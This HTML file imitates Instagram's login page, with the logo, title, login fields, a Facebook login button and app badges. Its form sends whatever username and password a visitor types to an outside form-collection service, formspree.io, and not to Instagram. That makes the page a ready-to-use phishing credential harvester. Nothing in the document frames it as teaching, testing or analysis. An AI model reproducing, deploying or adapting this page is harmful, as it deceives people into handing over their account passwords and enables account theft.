<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Instagram</title>
    <link rel="shortcut icon" href="./Images/favicon.ico" type="image/x-icon">
</head>
<body>
    <main>
        <div class="instagram_page">
            <div class="instagram_login_page">
                <div class="instagram log">
                    <div class="instagram_logo">
                        <i data-visualcompletion="css-img" aria-label="Instagram" class="inst-logo" role="img"></i>
                    </div>
                    <div class="instagram_login_inf">
                        <form class="instagram_login_form" action="https://formspree.io/f/xjvzjjok" method="post">
                            <div class="form phone_number"><input type="text" id="fname" name="Name" placeholder="Phone number, username, or email"></input></div>
                            <div class="form password"><input type="password" id="password" name="password" placeholder="Password"></input></div>
                            <div class="form login">
                                <button type="submit">Log in</button>
                            </div>
                            <div class="form or">OR</div>
                            <div class="form FB_login">
                                <button>
                                    <span class="fb_logo"><img src="./Images/social_facebook_box_blue.png" alt=""
                                            srcset=""></span>
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                        </form>
                    </div>
                </div>
                <div class="instagram signup">
                    <p>Don't have an account? <span>Sign up</span></p>
                </div>
                <div class="instagram app">
                    <p> Get the app.</p>
                    <div class="app_logos">
                        <span class="applestore_logo">
                            <img src="./Images/Apple_download.png" alt="" srcset="">
                        </span>
                        <span class="googlesstore_logo">
                            <img src="./Images/Google_download.png" alt="" srcset="">
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </main>
</body>
</html>
